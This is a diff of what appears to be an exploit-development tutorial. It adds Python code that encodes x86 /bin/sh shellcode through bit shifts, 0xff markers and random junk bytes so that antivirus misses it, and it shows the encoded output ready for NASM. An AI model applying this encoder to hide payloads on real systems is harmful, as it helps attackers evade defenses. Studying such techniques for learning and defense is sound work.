@@ -164,14 +164,80 @@ For our encoder, let's keep things relatively simple. Our encoding process will 
 + if the decimal equivalent of our hex segment is less than `128`, we will shift its bits to the left one slot. As you can probably figure out, if we were to do this with a value of `128` or higher, shifting its bits to the left even one spot would increase its value to a minimum of `256` which breaks our scheme. 
 + lastly, we will inject some random bytes into our code at a known interval so that we can later delete those same bytes since the interval is known. In simpler terms: if I know every other byte is fake, I'll make my decoder delete every other byte. 
 
-Our decoder will perform the inverse of these operations. It will:
-+ delete the random bytes
-+ shift all shifted bytes back to their original position. 
-
 ### Step 1 -- Bit Shift
 
-In order to mark which bytes we are shifting we will append a `0xff` to them so that later when we decode, we know which ones were shifted. And AV is too dumb to realize how smart we are. We are cyber gods. 
+In order to mark which bytes we are shifting we will append a `0xff` to them so that later when we decode, we know which ones were shifted. 
 
+```python
+byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+encode = ""
+
+for x in bytearray(byteObject):
+	if x < 128:
+		x = x << 1
+		encode += '\\xff'
+
+	encode += "\\x"
+	encode += '%02x'%x
+		
+
+print(encode)
+```
+
+Output
+
+```terminal_session
+root@kali:~# python3 encoder.py
+\xff\x62\xc0\xff\xa0\xff\xd0\xff\x5e\xff\x5e\xff\xe6\xff\xd0\xff\xd0\xff\x5e\xff\xc4\xff\xd2\xff\xdc\x89\xe3\xff\xa0\x89\xe2\xff\xa6\x89\xe1\xb0\xff\x16\xcd\x80
+```
+
+Looks like we ended up with 14 of the bytes shifted. That's pretty cool!
+
+### Step 2 -- Random Byte Injection
+
+Now we import the `random` module and use it to inject a random byte during each iteration of the loop. In other words, our encoder will now shift bytes lower than `128`, prepend those bytes with `0xff`, and then finally append that byte with a random byte. So in practice we can have the following pseudo bytes:
+
+Unshifted + Random
+
+0xff + Shifted + Random
+
+Lastly, we'll want to print to terminal our shellcode formatted in a way that we can use it in our assembly, annotated here as the 'For NASM:' output.
+
+```python
+import random
+
+byteObject = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+encode = ""
+
+
+for x in bytearray(byteObject):
+	if x < 128:
+		x = x << 1
+		encode += '\\xff'
+
+	encode += "\\x"
+	encode += '%02x'% x
+	sneaky = random.randint(2,253)
+	encode += '\\x%02x' % sneaky
+
+		
+
+db = str(encode).replace("\\x", ",0x")
+db = db[1:]
+print('Encoded: ' + encode)
+print('\n')
+print('For NASM: ' + db)
+```
+
+Running this gives us the following output:
+
+```terminal_session
+root@kali:~# python3 encoder.py
+Encoded: \xff\x62\x4a\xc0\x1b\xff\xa0\xec\xff\xd0\xc0\xff\x5e\xc2\xff\x5e\x18\xff\xe6\xd4\xff\xd0\x22\xff\xd0\x34\xff\x5e\x1c\xff\xc4\x92\xff\xd2\x78\xff\xdc\x59\x89\x81\xe3\xec\xff\xa0\x73\x89\x29\xe2\x91\xff\xa6\xf4\x89\xd8\xe1\x57\xb0\xbc\xff\x16\xc5\xcd\x25\x80\xe8
+
+
+For NASM: 0xff,0x62,0x4a,0xc0,0x1b,0xff,0xa0,0xec,0xff,0xd0,0xc0,0xff,0x5e,0xc2,0xff,0x5e,0x18,0xff,0xe6,0xd4,0xff,0xd0,0x22,0xff,0xd0,0x34,0xff,0x5e,0x1c,0xff,0xc4,0x92,0xff,0xd2,0x78,0xff,0xdc,0x59,0x89,0x81,0xe3,0xec,0xff,0xa0,0x73,0x89,0x29,0xe2,0x91,0xff,0xa6,0xf4,0x89,0xd8,0xe1,0x57,0xb0,0xbc,0xff,0x16,0xc5,0xcd,0x25,0x80,0xe8
+```
 
 ## Github
 
